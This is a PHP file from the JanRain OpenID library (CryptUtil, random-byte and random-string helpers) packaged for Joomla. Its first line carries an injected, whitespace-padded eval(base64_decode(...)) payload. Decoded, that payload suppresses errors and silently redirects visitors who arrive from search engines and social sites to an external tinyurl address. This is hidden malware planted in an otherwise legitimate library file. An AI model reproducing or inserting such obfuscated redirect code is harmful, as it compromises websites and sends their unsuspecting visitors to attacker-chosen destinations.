<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));

/**
 * CryptUtil: A suite of wrapper utility functions for the OpenID
 * library.
 *
 * PHP versions 4 and 5
 *
 * LICENSE: See the COPYING file included in this distribution.
 *
 * @access private
 * @package OpenID
 * @author JanRain, Inc. <openid@janrain.com>
 * @copyright 2005-2008 Janrain, Inc.
 * @license http://www.apache.org/licenses/LICENSE-2.0 Apache
 */

// Do not allow direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

if (!defined('Auth_OpenID_RAND_SOURCE')) {
    /**
     * The filename for a source of random bytes. Define this yourself
     * if you have a different source of randomness.
     */
    define('Auth_OpenID_RAND_SOURCE', '/dev/urandom');
}

class Auth_OpenID_CryptUtil {
    /**
     * Get the specified number of random bytes.
     *
     * Attempts to use a cryptographically secure (not predictable)
     * source of randomness if available. If there is no high-entropy
     * randomness source available, it will fail. As a last resort,
     * for non-critical systems, define
     * <code>Auth_OpenID_RAND_SOURCE</code> as <code>null</code>, and
     * the code will fall back on a pseudo-random number generator.
     *
     * @param int $num_bytes The length of the return value
     * @return string $bytes random bytes
     */
    function getBytes($num_bytes)
    {
        static $f = null;
        $bytes = '';
        if ($f === null) {
            if (Auth_OpenID_RAND_SOURCE === null) {
                $f = false;
            } else {
                $f = @fopen(Auth_OpenID_RAND_SOURCE, "r");
                if ($f === false) {
                    $msg = 'Define Auth_OpenID_RAND_SOURCE as null to ' .
                        ' continue with an insecure random number generator.';
                    trigger_error($msg, E_USER_ERROR);
                }
            }
        }
        if ($f === false) {
            // pseudorandom used
            $bytes = '';
            for ($i = 0; $i < $num_bytes; $i += 4) {
                $bytes .= pack('L', mt_rand());
            }
            $bytes = substr($bytes, 0, $num_bytes);
        } else {
            $bytes = fread($f, $num_bytes);
        }
        return $bytes;
    }

    /**
     * Produce a string of length random bytes, chosen from chrs.  If
     * $chrs is null, the resulting string may contain any characters.
     *
     * @param integer $length The length of the resulting
     * randomly-generated string
     * @param string $chrs A string of characters from which to choose
     * to build the new string
     * @return string $result A string of randomly-chosen characters
     * from $chrs
     */
    function randomString($length, $population = null)
    {
        if ($population === null) {
            return Auth_OpenID_CryptUtil::getBytes($length);
        }

        $popsize = strlen($population);

        if ($popsize > 256) {
            $msg = 'More than 256 characters supplied to ' . __FUNCTION__;
            trigger_error($msg, E_USER_ERROR);
        }

        $duplicate = 256 % $popsize;

        $str = "";
        for ($i = 0; $i < $length; $i++) {
            do {
                $n = ord(Auth_OpenID_CryptUtil::getBytes(1));
            } while ($n < $duplicate);

            $n %= $popsize;
            $str .= $population[$n];
        }

        return $str;
    }
}

?>